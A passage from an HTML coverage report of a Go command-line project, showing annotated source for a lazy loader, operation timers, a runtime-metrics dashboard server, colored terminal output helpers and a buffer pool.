// Get returns the loaded value, loading it if necessary
func (ll *LazyLoader[T]) Get() (T, error) <span class="cov8" title="1">{
        // Fast path: check if already loaded (read lock only)
        ll.mu.RLock()
        if ll.loaded </span><span class="cov8" title="1">{
                defer ll.mu.RUnlock()
                return ll.value, ll.err
        }</span>
        <span class="cov8" title="1">ll.mu.RUnlock()

        // Slow path: need to load the value (write lock required)
        ll.mu.Lock()
        defer ll.mu.Unlock()

        // Double-check after acquiring write lock
        if ll.loaded </span><span class="cov0" title="0">{
                return ll.value, ll.err
        }</span>

        // Load the value
        <span class="cov8" title="1">ll.value, ll.err = ll.loader()
        ll.loaded = true
        atomic.AddInt64(&amp;ll.loadCount, 1)

        return ll.value, ll.err</span>
}

// Reset clears the loaded value, forcing it to be reloaded on next access
func (ll *LazyLoader[T]) Reset() <span class="cov8" title="1">{
        ll.mu.Lock()
        defer ll.mu.Unlock()

        var zero T
        ll.value = zero
        ll.err = nil
        ll.loaded = false
}</span>

// IsLoaded returns true if the value has been loaded
func (ll *LazyLoader[T]) IsLoaded() bool <span class="cov8" title="1">{
        ll.mu.RLock()
        defer ll.mu.RUnlock()

        return ll.loaded
}</span>

// GetLoadCount returns the number of times the loader function has been called
func (ll *LazyLoader[T]) GetLoadCount() int64 <span class="cov8" title="1">{
        return atomic.LoadInt64(&amp;ll.loadCount)
}</span>

// Helper function for max calculation
func maxInt(a, b int) int <span class="cov8" title="1">{
        if a &gt; b </span><span class="cov8" title="1">{
                return a
        }</span>
        <span class="cov8" title="1">return b</span>
}
</pre>

		<pre class="file" id="file41" style="display: none">// Package metrics provides performance monitoring and timing utilities.
//
// This package implements comprehensive operation timing with support for
// nested operations, context metadata, and automatic performance warnings.
// It is designed to provide visibility into operation durations across
// the entire go-broadcast application.
//
// Key features include:
// - Timer struct for tracking operation duration
// - Context-aware timing with cancellation support
// - Metadata attachment through AddField method
// - Automatic warnings for slow operations (&gt;30 seconds)
// - Human-readable duration formatting
// - Integration with structured logging
//
// Usage examples:
//
//        // Basic operation timing
//        timer := metrics.StartTimer(ctx, logger, "repository_sync")
//        defer timer.Stop()
//
//        // Timer with additional context
//        timer := metrics.StartTimer(ctx, logger, "git_clone").
//          AddField("repo", "owner/repo").
//          AddField("branch", "master")
//        defer timer.Stop()
//
// Important notes:
// - All timing operations accept context.Context for cancellation
// - Timer.Stop() should always be called to complete timing measurement
// - Nested timers are supported for detailed operation breakdown
package metrics

import (
        "context"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/logging"
)

// Timer tracks the duration of an operation with support for additional metadata.
//
// Timer provides comprehensive operation timing with automatic logging of
// duration, warnings for slow operations, and support for attaching
// contextual metadata through the AddField method.
type Timer struct {
        start     time.Time
        operation string
        logger    *logrus.Entry
        fields    logrus.Fields
        ctx       context.Context //nolint:containedctx // Context needed for cancellation checks during timer lifecycle
}

// StartTimer creates a new timer for an operation.
//
// This function creates a timer that begins tracking the duration of an
// operation immediately. The timer integrates with the structured logging
// system and supports metadata attachment for detailed operation context.
//
// Parameters:
// - ctx: Context for cancellation control and operation lifecycle
// - logger: Logger entry for structured output with correlation
// - operation: Name of the operation being timed for identification
//
// Returns:
// - Timer instance for tracking operation duration and metadata
//
// Side Effects:
// - Records the start time for duration calculation
// - Creates a logger entry with operation context
// - Initializes fields map for metadata storage
func StartTimer(ctx context.Context, logger *logrus.Entry, operation string) *Timer <span class="cov8" title="1">{
        // Create timer with current timestamp and operation context
        timer := &amp;Timer{
                start:     time.Now(),
                operation: operation,
                logger:    logger.WithField(logging.StandardFields.Operation, operation),
                fields:    make(logrus.Fields),
                ctx:       ctx,
        }

        return timer
}</span>

// AddField adds a field to be logged when the timer stops.
//
// This method allows attaching additional context and metadata to the
// timer that will be included in the final timing log entry. This is
// useful for providing operation-specific details like repository names,
// file counts, or other relevant metrics.
//
// Parameters:
// - key: Field name for the metadata entry
// - value: Field value (any type supported by logrus)
//
// Returns:
// - Timer instance for method chaining
//
// Side Effects:
// - Stores the field in the timer's metadata for later logging
//
// Notes:
// - Method chaining is supported for multiple field assignments
// - Fields are logged when Stop() is called
func (t *Timer) AddField(key string, value interface{}) *Timer <span class="cov8" title="1">{
        t.fields[key] = value
        return t
}</span>

// Stop stops the timer and logs the duration with performance analysis.
//
// This method completes the timing measurement, calculates the total
// duration, and logs the results with appropriate warning levels for
// slow operations. It includes both machine-readable milliseconds and
// human-readable duration formatting.
//
// Returns:
// - Duration of the operation as time.Duration
//
// Side Effects:
// - Logs operation duration with context and metadata
// - Issues warnings for operations taking longer than 30 seconds
// - Includes all attached fields in the log entry
//
// Performance Analysis:
// - Operations &gt; 30 seconds: WARNING level with slow operation message
// - Normal operations: DEBUG level with completion message
// - All operations include duration_ms and duration_human fields
func (t *Timer) Stop() time.Duration <span class="cov8" title="1">{
        // Calculate total duration since timer start
        duration := time.Since(t.start)

        // Add standard timing fields
        t.fields[logging.StandardFields.DurationMs] = duration.Milliseconds()
        t.fields["duration_human"] = duration.String()

        // Check for slow operations and log with appropriate level
        if duration &gt; 30*time.Second </span><span class="cov8" title="1">{
                t.logger.WithFields(t.fields).Warn("Operation took longer than expected")
        }</span> else<span class="cov8" title="1"> {
                t.logger.WithFields(t.fields).Debug("Operation completed")
        }</span>

        <span class="cov8" title="1">return duration</span>
}

// StopWithError stops the timer and logs the duration with error context.
//
// This method is similar to Stop() but includes error information in the
// log entry. It's useful for timing operations that may fail, providing
// both duration and error context for debugging.
//
// Parameters:
// - err: Error that occurred during the operation (can be nil)
//
// Returns:
// - Duration of the operation as time.Duration
//
// Side Effects:
// - Logs operation duration with error context
// - Uses ERROR level for failed operations, DEBUG for successful ones
// - Includes all attached fields and error information in log entry
func (t *Timer) StopWithError(err error) time.Duration <span class="cov8" title="1">{
        duration := time.Since(t.start)

        // Add standard timing fields
        t.fields[logging.StandardFields.DurationMs] = duration.Milliseconds()
        t.fields["duration_human"] = duration.String()

        if err != nil </span><span class="cov8" title="1">{
                // Log failed operations at ERROR level with error context
                t.fields[logging.StandardFields.Error] = err.Error()
                t.fields[logging.StandardFields.Status] = "failed"
                t.logger.WithFields(t.fields).Error("Operation failed")
        }</span> else<span class="cov8" title="1"> {
                // Log successful operations based on duration
                t.fields[logging.StandardFields.Status] = "completed"
                if duration &gt; 30*time.Second </span><span class="cov0" title="0">{
                        t.logger.WithFields(t.fields).Warn("Operation completed but took longer than expected")
                }</span> else<span class="cov8" title="1"> {
                        t.logger.WithFields(t.fields).Debug("Operation completed successfully")
                }</span>
        }

        <span class="cov8" title="1">return duration</span>
}

// CheckCancellation checks if the operation context has been canceled.
//
// This method provides a convenient way to check for context cancellation
// during long-running operations. It can be called periodically to ensure
// responsive cancellation behavior.
//
// Returns:
// - true if the context has been canceled, false otherwise
//
// Notes:
// - Should be called periodically during long operations
// - Does not affect timer state or logging
// - Provides early cancellation detection
func (t *Timer) CheckCancellation() bool <span class="cov8" title="1">{
        select </span>{
        case &lt;-t.ctx.Done():<span class="cov8" title="1">
                return true</span>
        default:<span class="cov8" title="1">
                return false</span>
        }
}

// GetElapsed returns the current elapsed time without stopping the timer.
//
// This method provides access to the current elapsed duration without
// completing the timing operation. It's useful for progress monitoring
// or intermediate timing checks.
//
// Returns:
// - Current elapsed duration since timer start
//
// Side Effects:
// - None - timer continues running normally
//
// Notes:
// - Timer continues running after this call
// - Can be called multiple times for progress monitoring
func (t *Timer) GetElapsed() time.Duration <span class="cov8" title="1">{
        return time.Since(t.start)
}</span>
</pre>

		<pre class="file" id="file42" style="display: none">// Package monitoring provides runtime metrics collection and dashboard functionality for system monitoring.
package monitoring

import (
        "context"
        "encoding/json"
        "errors"
        "fmt"
        "log"
        "net/http"
        "runtime"
        "sync"
        "time"

        "github.com/mrz1836/go-broadcast/internal/profiling"
)

// MetricsCollector collects and aggregates runtime metrics
type MetricsCollector struct {
        mu      sync.RWMutex
        metrics map[string]interface{}

        // Configuration
        collectInterval time.Duration
        retainHistory   int

        // History storage
        history []MetricsSnapshot

        // Control
        cancel context.CancelFunc

        // Components
        profiler *profiling.MemoryProfiler
}

// MetricsSnapshot represents metrics at a point in time
type MetricsSnapshot struct {
        Timestamp time.Time              `json:"timestamp"`
        Metrics   map[string]interface{} `json:"metrics"`
}

// DashboardConfig configures the monitoring dashboard
type DashboardConfig struct {
        Port            int           `json:"port"`
        CollectInterval time.Duration `json:"collect_interval"`
        RetainHistory   int           `json:"retain_history"`
        EnableProfiling bool          `json:"enable_profiling"`
        ProfileDir      string        `json:"profile_dir"`
}

// DefaultDashboardConfig returns default dashboard configuration
func DefaultDashboardConfig() DashboardConfig <span class="cov8" title="1">{
        return DashboardConfig{
                Port:            8080,
                CollectInterval: time.Second,
                RetainHistory:   300, // 5 minutes of history at 1-second intervals
                EnableProfiling: false,
                ProfileDir:      "./profiles",
        }
}</span>

// NewMetricsCollector creates a new metrics collector
func NewMetricsCollector(config DashboardConfig) *MetricsCollector <span class="cov8" title="1">{
        ctx, cancel := context.WithCancel(context.Background())

        mc := &amp;MetricsCollector{
                metrics:         make(map[string]interface{}),
                collectInterval: config.CollectInterval,
                retainHistory:   config.RetainHistory,
                history:         make([]MetricsSnapshot, 0, config.RetainHistory),
                cancel:          cancel,
        }

        // Start collection with the context
        go mc.collect(ctx)

        // Initialize profiler if enabled
        if config.EnableProfiling </span><span class="cov8" title="1">{
                mc.profiler = profiling.NewMemoryProfiler(config.ProfileDir)
                if err := mc.profiler.Enable(); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to enable profiler: %v\n", err)
                }</span>
        }

        // Collection is already started in the constructor

        <span class="cov8" title="1">return mc</span>
}

// GetCurrentMetrics returns the current metrics
func (mc *MetricsCollector) GetCurrentMetrics() map[string]interface{} <span class="cov8" title="1">{
        mc.mu.RLock()
        defer mc.mu.RUnlock()

        // Return a copy to prevent external modification
        result := make(map[string]interface{})
        for k, v := range mc.metrics </span><span class="cov8" title="1">{
                result[k] = v
        }</span>

        <span class="cov8" title="1">return result</span>
}

// GetMetricsHistory returns historical metrics
func (mc *MetricsCollector) GetMetricsHistory() []MetricsSnapshot <span class="cov8" title="1">{
        mc.mu.RLock()
        defer mc.mu.RUnlock()

        // Return a copy to prevent external modification
        history := make([]MetricsSnapshot, len(mc.history))
        copy(history, mc.history)

        return history
}</span>

// ServeHTTP implements http.Handler for metrics endpoint
func (mc *MetricsCollector) ServeHTTP(w http.ResponseWriter, r *http.Request) <span class="cov8" title="1">{
        w.Header().Set("Content-Type", "application/json")
        w.Header().Set("Access-Control-Allow-Origin", "*")
        w.Header().Set("Access-Control-Allow-Methods", "GET, OPTIONS")
        w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

        if r.Method == "OPTIONS" </span><span class="cov8" title="1">{
                w.WriteHeader(http.StatusOK)
                return
        }</span>

        // Check query parameters for different data types
        <span class="cov8" title="1">switch r.URL.Query().Get("type") </span>{
        case "history":<span class="cov8" title="1">
                history := mc.GetMetricsHistory()
                if err := json.NewEncoder(w).Encode(map[string]interface{}{
                        "history": history,
                }); err != nil </span><span class="cov0" title="0">{
                        http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                }</span>
        default:<span class="cov8" title="1">
                current := mc.GetCurrentMetrics()
                if err := json.NewEncoder(w).Encode(current); err != nil </span><span class="cov0" title="0">{
                        http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                }</span>
        }
}

// Stop stops the metrics collection
func (mc *MetricsCollector) Stop() <span class="cov8" title="1">{
        mc.cancel()

        if mc.profiler != nil </span><span class="cov8" title="1">{
                if err := mc.profiler.Disable(); err != nil </span><span class="cov0" title="0">{
                        log.Printf("Warning: failed to disable profiler: %v", err)
                }</span>
        }
}

// collect periodically gathers metrics
func (mc *MetricsCollector) collect(ctx context.Context) <span class="cov8" title="1">{
        // Ensure collectInterval is positive to prevent panic
        if mc.collectInterval &lt;= 0 </span><span class="cov8" title="1">{
                mc.collectInterval = time.Second // Default fallback
        }</span>

        <span class="cov8" title="1">ticker := time.NewTicker(mc.collectInterval)
        defer ticker.Stop()

        for </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-ticker.C:<span class="cov8" title="1">
                        mc.updateMetrics()</span>
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        return</span>
                }
        }
}

// updateMetrics collects current system metrics
func (mc *MetricsCollector) updateMetrics() <span class="cov8" title="1">{
        var memStats runtime.MemStats
        runtime.ReadMemStats(&amp;memStats)

        // Get current timestamp
        now := time.Now()

        // Create metrics map
        currentMetrics := map[string]interface{}{
                "timestamp": now.Unix(),
                "memory": map[string]interface{}{
                        "alloc_mb":       float64(memStats.Alloc) / 1024 / 1024,
                        "total_alloc_mb": float64(memStats.TotalAlloc) / 1024 / 1024,
                        "sys_mb":         float64(memStats.Sys) / 1024 / 1024,
                        "heap_alloc_mb":  float64(memStats.HeapAlloc) / 1024 / 1024,
                        "heap_sys_mb":    float64(memStats.HeapSys) / 1024 / 1024,
                        "heap_objects":   memStats.HeapObjects,
                        "stack_sys_mb":   float64(memStats.StackSys) / 1024 / 1024,
                        "next_gc_mb":     float64(memStats.NextGC) / 1024 / 1024,
                },
                "gc": map[string]interface{}{
                        "num_gc":         memStats.NumGC,
                        "num_forced":     memStats.NumForcedGC,
                        "pause_total_ms": float64(memStats.PauseTotalNs) / 1e6,
                },
                "runtime": map[string]interface{}{
                        "goroutines": runtime.NumGoroutine(),
                        "num_cpu":    runtime.NumCPU(),
                        "gomaxprocs": runtime.GOMAXPROCS(-1),
                        "go_version": runtime.Version(),
                },
        }

        // Add GC pause information if available
        if memStats.NumGC &gt; 0 </span><span class="cov8" title="1">{
                // Get the most recent GC pause
                recentPause := memStats.PauseNs[(memStats.NumGC+255)%256]
                avgPause := float64(memStats.PauseTotalNs) / float64(memStats.NumGC) / 1e6

                gcMetrics := currentMetrics["gc"].(map[string]interface{})
                gcMetrics["last_pause_ms"] = float64(recentPause) / 1e6
                gcMetrics["avg_pause_ms"] = avgPause
                gcMetrics["last_gc_time"] = time.Unix(0, int64(memStats.LastGC)).Unix() //nolint:gosec // GC timestamp unlikely to overflow
        }</span>

        // Add profiler statistics if available
        <span class="cov8" title="1">if mc.profiler != nil </span><span class="cov0" title="0">{
                profilerStats := mc.profiler.GetProfilerStats()
                currentMetrics["profiler"] = map[string]interface{}{
                        "enabled":         profilerStats.Enabled,
                        "active_sessions": profilerStats.ActiveSessions,
                        "total_sessions":  profilerStats.TotalSessions,
                        "profile_count":   profilerStats.ProfileCount,
                }
        }</span>

        // Update current metrics
        <span class="cov8" title="1">mc.mu.Lock()
        mc.metrics = currentMetrics

        // Add to history
        snapshot := MetricsSnapshot{
                Timestamp: now,
                Metrics:   make(map[string]interface{}),
        }

        // Deep copy metrics for history
        for k, v := range currentMetrics </span><span class="cov8" title="1">{
                snapshot.Metrics[k] = v
        }</span>

        <span class="cov8" title="1">mc.history = append(mc.history, snapshot)

        // Trim history if needed
        if len(mc.history) &gt; mc.retainHistory </span><span class="cov8" title="1">{
                mc.history = mc.history[1:]
        }</span>

        <span class="cov8" title="1">mc.mu.Unlock()</span>
}

// Dashboard manages the HTTP dashboard server
type Dashboard struct {
        collector *MetricsCollector
        server    *http.Server
        config    DashboardConfig
        startTime time.Time
}

// NewDashboard creates a new monitoring dashboard
func NewDashboard(config DashboardConfig) *Dashboard <span class="cov8" title="1">{
        collector := NewMetricsCollector(config)

        mux := http.NewServeMux()

        dashboard := &amp;Dashboard{
                collector: collector,
                server:    nil, // Will be set below
                config:    config,
                startTime: time.Now(),
        }

        // API endpoints
        mux.Handle("/api/metrics", collector)
        mux.HandleFunc("/api/health", dashboard.healthHandler)

        // Static dashboard page
        mux.HandleFunc("/", dashboardHandler)
        mux.HandleFunc("/dashboard.js", dashboardJSHandler)
        mux.HandleFunc("/dashboard.css", dashboardCSSHandler)

        server := &amp;http.Server{
                Addr:              fmt.Sprintf(":%d", config.Port),
                Handler:           mux,
                ReadHeaderTimeout: 30 * time.Second, // Prevent Slowloris attacks
                ReadTimeout:       60 * time.Second,
                WriteTimeout:      60 * time.Second,
                IdleTimeout:       120 * time.Second,
        }

        dashboard.server = server
        return dashboard
}</span>

// Start starts the dashboard server
func (d *Dashboard) Start() error <span class="cov8" title="1">{
        log.Printf("Performance dashboard starting on http://localhost:%d\n", d.config.Port)
        return d.server.ListenAndServe()
}</span>

// StartBackground starts the dashboard server in the background
func (d *Dashboard) StartBackground(ctx context.Context) error <span class="cov8" title="1">{
        go func() </span><span class="cov8" title="1">{
                if err := d.Start(); err != nil &amp;&amp; !errors.Is(err, http.ErrServerClosed) </span><span class="cov8" title="1">{
                        log.Printf("Dashboard server error: %v\n", err)
                }</span>
        }()

        // Wait for context cancellation
        <span class="cov8" title="1">&lt;-ctx.Done()
        return d.Stop(ctx)</span>
}

// Stop stops the dashboard server
func (d *Dashboard) Stop(ctx context.Context) error <span class="cov8" title="1">{
        d.collector.Stop()
        return d.server.Shutdown(ctx)
}</span>

// GetCollector returns the metrics collector
func (d *Dashboard) GetCollector() *MetricsCollector <span class="cov8" title="1">{
        return d.collector
}</span>

// healthHandler handles health check requests
func (d *Dashboard) healthHandler(w http.ResponseWriter, _ *http.Request) <span class="cov8" title="1">{
        w.Header().Set("Content-Type", "application/json")
        w.WriteHeader(http.StatusOK)

        response := map[string]interface{}{
                "status":    "healthy",
                "timestamp": time.Now().Unix(),
                "uptime":    time.Since(d.startTime).Seconds(),
        }

        if err := json.NewEncoder(w).Encode(response); err != nil </span><span class="cov8" title="1">{
                log.Printf("Warning: failed to encode health response: %v", err)
        }</span>
}

// dashboardHandler serves the main dashboard HTML page
func dashboardHandler(w http.ResponseWriter, _ *http.Request) <span class="cov8" title="1">{
        w.Header().Set("Content-Type", "text/html")
        if _, err := fmt.Fprint(w, dashboardHTML); err != nil </span><span class="cov8" title="1">{
                log.Printf("Warning: failed to write dashboard HTML: %v", err)
        }</span>
}

// dashboardJSHandler serves the dashboard JavaScript
func dashboardJSHandler(w http.ResponseWriter, _ *http.Request) <span class="cov8" title="1">{
        w.Header().Set("Content-Type", "application/javascript")
        if _, err := fmt.Fprint(w, dashboardJS); err != nil </span><span class="cov8" title="1">{
                log.Printf("Warning: failed to write dashboard JS: %v", err)
        }</span>
}

// dashboardCSSHandler serves the dashboard CSS
func dashboardCSSHandler(w http.ResponseWriter, _ *http.Request) <span class="cov8" title="1">{
        w.Header().Set("Content-Type", "text/css")
        if _, err := fmt.Fprint(w, dashboardCSS); err != nil </span><span class="cov8" title="1">{
                log.Printf("Warning: failed to write dashboard CSS: %v", err)
        }</span>
}

// StartDashboard is a convenience function to start a dashboard with default config
func StartDashboard(port int) error <span class="cov8" title="1">{
        config := DefaultDashboardConfig()
        config.Port = port

        dashboard := NewDashboard(config)
        return dashboard.Start()
}</span>

// StartDashboardWithProfiling starts a dashboard with profiling enabled
func StartDashboardWithProfiling(port int, profileDir string) error <span class="cov8" title="1">{
        config := DefaultDashboardConfig()
        config.Port = port
        config.EnableProfiling = true
        config.ProfileDir = profileDir

        dashboard := NewDashboard(config)
        return dashboard.Start()
}</span>
</pre>

		<pre class="file" id="file43" style="display: none">// Package output provides colored output functions for the CLI.
package output

import (
        "fmt"
        "io"
        "os"
        "sync"

        "github.com/fatih/color"
)

// Writer defines the interface for output operations
type Writer interface {
        Success(msg string)
        Successf(format string, args ...interface{})
        Info(msg string)
        Infof(format string, args ...interface{})
        Warn(msg string)
        Warnf(format string, args ...interface{})
        Error(msg string)
        Errorf(format string, args ...interface{})
        Plain(msg string)
        Plainf(format string, args ...interface{})
}

// ColoredWriter implements Writer with colored output
type ColoredWriter struct {
        successColor *color.Color
        infoColor    *color.Color
        warnColor    *color.Color
        errorColor   *color.Color
        stdout       io.Writer
        stderr       io.Writer
        mu           sync.Mutex
}

// NewColoredWriter creates a new ColoredWriter instance
func NewColoredWriter(stdout, stderr io.Writer) *ColoredWriter <span class="cov8" title="1">{
        return &amp;ColoredWriter{
                successColor: color.New(color.FgGreen, color.Bold),
                infoColor:    color.New(color.FgCyan),
                warnColor:    color.New(color.FgYellow),
                errorColor:   color.New(color.FgRed, color.Bold),
                stdout:       stdout,
                stderr:       stderr,
        }
}</span>

// Success prints a success message in green
func (w *ColoredWriter) Success(msg string) <span class="cov8" title="1">{
        w.mu.Lock()
        defer w.mu.Unlock()
        _, _ = w.successColor.Fprintln(w.stdout, msg)
}</span>

// Successf prints a formatted success message
func (w *ColoredWriter) Successf(format string, args ...interface{}) <span class="cov8" title="1">{
        w.Success(fmt.Sprintf(format, args...))
}</span>

// Info prints an info message in cyan
func (w *ColoredWriter) Info(msg string) <span class="cov8" title="1">{
        w.mu.Lock()
        defer w.mu.Unlock()
        _, _ = w.infoColor.Fprintln(w.stdout, msg)
}</span>

// Infof prints a formatted info message
func (w *ColoredWriter) Infof(format string, args ...interface{}) <span class="cov8" title="1">{
        w.Info(fmt.Sprintf(format, args...))
}</span>

// Warn prints a warning message in yellow
func (w *ColoredWriter) Warn(msg string) <span class="cov8" title="1">{
        w.mu.Lock()
        defer w.mu.Unlock()
        _, _ = w.warnColor.Fprintln(w.stderr, msg)
}</span>

// Warnf prints a formatted warning message
func (w *ColoredWriter) Warnf(format string, args ...interface{}) <span class="cov8" title="1">{
        w.Warn(fmt.Sprintf(format, args...))
}</span>

// Error prints an error message in red
func (w *ColoredWriter) Error(msg string) <span class="cov8" title="1">{
        w.mu.Lock()
        defer w.mu.Unlock()
        _, _ = w.errorColor.Fprintln(w.stderr, msg)
}</span>

// Errorf prints a formatted error message
func (w *ColoredWriter) Errorf(format string, args ...interface{}) <span class="cov8" title="1">{
        w.Error(fmt.Sprintf(format, args...))
}</span>

// Plain prints a message without color
func (w *ColoredWriter) Plain(msg string) <span class="cov8" title="1">{
        w.mu.Lock()
        defer w.mu.Unlock()
        _, _ = fmt.Fprintln(w.stdout, msg)
}</span>

// Plainf prints a formatted message without color
func (w *ColoredWriter) Plainf(format string, args ...interface{}) <span class="cov8" title="1">{
        w.Plain(fmt.Sprintf(format, args...))
}</span>

//nolint:gochecknoglobals // Output package requires package-level state for consistent formatting
var (
        // Color functions
        successColor = color.New(color.FgGreen, color.Bold)
        infoColor    = color.New(color.FgCyan)
        warnColor    = color.New(color.FgYellow)
        errorColor   = color.New(color.FgRed, color.Bold)

        // Output writers
        stdout io.Writer = os.Stdout
        stderr io.Writer = os.Stderr

        // Mutex for thread-safe output
        mu sync.Mutex
)

// Init initializes the output system
func Init() <span class="cov8" title="1">{
        // Enable color output
        color.NoColor = false
}</span>

// SetStdout sets the standard output writer (useful for testing)
func SetStdout(w io.Writer) <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()

        stdout = w
}</span>

// SetStderr sets the standard error writer (useful for testing)
func SetStderr(w io.Writer) <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()

        stderr = w
}</span>

// Stdout returns the current stdout writer
func Stdout() io.Writer <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()

        return stdout
}</span>

// Stderr returns the current stderr writer
func Stderr() io.Writer <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()

        return stderr
}</span>

// Success prints a success message in green
func Success(msg string) <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()
        _, _ = successColor.Fprintln(stdout, msg)
}</span>

// Successf prints a formatted success message
func Successf(format string, args ...interface{}) <span class="cov8" title="1">{
        Success(fmt.Sprintf(format, args...))
}</span>

// Info prints an info message in cyan
func Info(msg string) <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()
        _, _ = infoColor.Fprintln(stdout, msg)
}</span>

// Infof prints a formatted info message
func Infof(format string, args ...interface{}) <span class="cov8" title="1">{
        Info(fmt.Sprintf(format, args...))
}</span>

// Warn prints a warning message in yellow
func Warn(msg string) <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()
        _, _ = warnColor.Fprintln(stderr, msg)
}</span>

// Warnf prints a formatted warning message
func Warnf(format string, args ...interface{}) <span class="cov8" title="1">{
        Warn(fmt.Sprintf(format, args...))
}</span>

// Error prints an error message in red
func Error(msg string) <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()
        _, _ = errorColor.Fprintln(stderr, msg)
}</span>

// Errorf prints a formatted error message
func Errorf(format string, args ...interface{}) <span class="cov8" title="1">{
        Error(fmt.Sprintf(format, args...))
}</span>

// Plain prints a message without color
func Plain(msg string) <span class="cov8" title="1">{
        mu.Lock()
        defer mu.Unlock()
        _, _ = fmt.Fprintln(stdout, msg)
}</span>

// Plainf prints a formatted message without color
func Plainf(format string, args ...interface{}) <span class="cov8" title="1">{
        Plain(fmt.Sprintf(format, args...))
}</span>

// Progress represents a progress indicator
type Progress struct {
        message string
        spinner []string
        index   int
        done    chan bool
        mu      sync.Mutex
}

// NewProgress creates a new progress indicator
func NewProgress(message string) *Progress <span class="cov8" title="1">{
        return &amp;Progress{
                message: message,
                spinner: []string{"‚†ã", "‚†ô", "‚†π", "‚†∏", "‚†º", "‚†¥", "‚†¶", "‚†ß", "‚†á", "‚†è"},
                done:    make(chan bool),
        }
}</span>

// Start begins showing the progress indicator
func (p *Progress) Start() <span class="cov8" title="1">{
        go func() </span><span class="cov8" title="1">{
                for </span><span class="cov8" title="1">{
                        select </span>{
                        case &lt;-p.done:<span class="cov8" title="1">
                                return</span>
                        default:<span class="cov8" title="1">
                                p.mu.Lock()
                                mu.Lock()
                                _, _ = fmt.Fprintf(stdout, "\r%s %s", p.spinner[p.index], p.message)
                                mu.Unlock()
                                p.index = (p.index + 1) % len(p.spinner)
                                p.mu.Unlock()</span>
                        }
                }
        }()
}

// Stop stops the progress indicator
func (p *Progress) Stop() <span class="cov8" title="1">{
        p.done &lt;- true
        mu.Lock()
        _, _ = fmt.Fprint(stdout, "\r\033[K") // Clear line
        mu.Unlock()
}</span>

// StopWithSuccess stops with a success message
func (p *Progress) StopWithSuccess(msg string) <span class="cov8" title="1">{
        p.Stop()
        Success(msg)
}</span>

// StopWithError stops with an error message
func (p *Progress) StopWithError(msg string) <span class="cov8" title="1">{
        p.Stop()
        Error(msg)
}</span>
</pre>

		<pre class="file" id="file44" style="display: none">// Package pool provides buffer pooling and resource management utilities for efficient memory usage.
package pool

import (
        "bytes"
        "sync"
        "sync/atomic"
)

// BufferPool manages multiple tiers of buffer pools with statistics
type BufferPool struct {
        smallBufferPool  *sync.Pool
        mediumBufferPool *sync.Pool
        largeBufferPool  *sync.Pool

        // Pool statistics for monitoring and optimization
        stats struct {
                smallGets  int64
                smallPuts  int64
                mediumGets int64
                mediumPuts int64
                largeGets  int64
                largePuts  int64
                oversized  int64 // Buffers too large for pooling
                resets     int64 // Buffer resets performed
        }
}

// NewBufferPool creates a new buffer pool instance
func NewBufferPool() *BufferPool <span class="cov8" title="1">{
        return &amp;BufferPool{
                smallBufferPool: &amp;sync.Pool{
                        New: func() interface{} </span><span class="cov8" title="1">{
                                return bytes.NewBuffer(make([]byte, 0, 1024)) // 1KB capacity
                        }</span>,
                },
                mediumBufferPool: &amp;sync.Pool{
                        New: func() interface{} <span class="cov8" title="1">{
                                return bytes.NewBuffer(make([]byte, 0, 8192)) // 8KB capacity
                        }</span>,
                },
                largeBufferPool: &amp;sync.Pool{
                        New: func() interface{} <span class="cov8" title="1">{
                                return bytes.NewBuffer(make([]byte, 0, 65536)) // 64KB capacity
                        }</span>,
                },
        }
}

var (
        defaultBufferPool *BufferPool //nolint:gochecknoglobals // Package-level singleton pattern
        defaultPoolOnce   sync.Once   //nolint:gochecknoglobals // Package-level singleton pattern
)

// getDefaultPool returns the default buffer pool, creating it if necessary
func getDefaultPool() *BufferPool <span class="cov8" title="1">{
        defaultPoolOnce.Do(func() </span><span class="cov8" title="1">{
                defaultBufferPool = NewBufferPool()
        }</span>)
        <span class="cov8" title="1">return defaultBufferPool</span>
}

// Size thresholds for pool selection
const (
        SmallBufferThreshold  = 1024   // 1KB
        MediumBufferThreshold = 8192   // 8KB
        LargeBufferThreshold  = 65536  // 64KB
        MaxPoolableSize       = 131072 // 128KB - don't pool buffers larger than this
)

// GetBuffer returns a buffer from the appropriate pool based on required size.
//
// The buffer selection is optimized for common usage patterns:
// - Small buffers (‚â§1KB): For short strings, config values, small JSON
// - Medium buffers (‚â§8KB): For file paths, moderate content, API responses
// - Large buffers (‚â§64KB): For file content, large transformations, diffs
//
// Parameters:
// - size: Minimum required buffer capacity in bytes
//
// Returns:
// - *bytes.Buffer from the appropriate pool, ready for use
//
// Performance Notes:
// - Buffers are pre-allocated with appropriate capacity to minimize reallocations
// - Pool selection is based on required size, not buffer content
// - Returned buffers may have larger capacity than requested (which is beneficial)
// GetBuffer returns a buffer from the appropriate pool based on required size.
func (bp *BufferPool) GetBuffer(size int) *bytes.Buffer <span class="cov8" title="1">{
        switch </span>{
        case size &lt;= SmallBufferThreshold:<span class="cov8" title="1">
                atomic.AddInt64(&amp;bp.stats.smallGets, 1)
                return bp.smallBufferPool.Get().(*bytes.Buffer)</span>
        case size &lt;= MediumBufferThreshold:<span class="cov8" title="1">
                atomic.AddInt64(&amp;bp.stats.mediumGets, 1)
                return bp.mediumBufferPool.Get().(*bytes.Buffer)</span>
        case size &lt;= LargeBufferThreshold:<span class="cov8" title="1">
                atomic.AddInt64(&amp;bp.stats.largeGets, 1)
                return bp.largeBufferPool.Get().(*bytes.Buffer)</span>
        default:<span class="cov8" title="1">
                // For very large requirements, create a new buffer without pooling
                // This prevents memory waste from pooling oversized buffers
                atomic.AddInt64(&amp;bp.stats.oversized, 1)
                return bytes.NewBuffer(make([]byte, 0, size))</span>
        }
}

// GetBuffer returns a buffer from the default pool based on required size.
//
// The buffer selection is optimized for common usage patterns:
